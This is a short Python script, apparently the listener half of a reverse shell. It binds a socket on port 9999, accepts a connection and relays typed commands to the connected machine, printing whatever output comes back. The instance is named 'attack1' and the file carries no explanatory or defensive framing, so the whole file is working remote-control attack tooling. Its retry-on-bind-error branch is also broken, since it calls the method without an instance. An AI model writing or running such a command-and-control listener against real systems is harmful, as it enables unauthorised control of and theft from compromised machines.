#working
import socket

class Sockets:
    def __init__(self,ip,port):
        self.ip = ip
        self.port = port
        try:
            self.s = socket.socket()
            print('Created Socket')
        except socket.error as error:
            print('Creation error:',str(error))
            return 
    def bind_socket(self):
        try:
            print('Binding port...',self.port)
            self.s.bind((self.ip,self.port))
        except socket.error as error:
            print("Binding Error",error)
            print("Retrying...")
            Sockets.bind_socket()
        self.s.listen(5)

    def socket_accept(self):
        self.conn,self.address = self.s.accept()
        print(self.conn)
        print("Connection Established")
        print("IP:",self.address[0])
        print("PORT:",self.address[1])
        def send_commands(conn):
            while(1):
                cmd = input()
                if(len(cmd)>0):
                    cmd = cmd.encode('utf-8')
                    conn.send(cmd)
                    client_response = conn.recv(1024)
                    client_response = client_response.decode('utf-8')
                    print(client_response,end='')
        
        send_commands(self.conn)
        self.conn.close()
     
def main():
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    port = 9999
    attack1 = Sockets(ip,port)
    attack1.bind_socket()
    attack1.socket_accept()

main()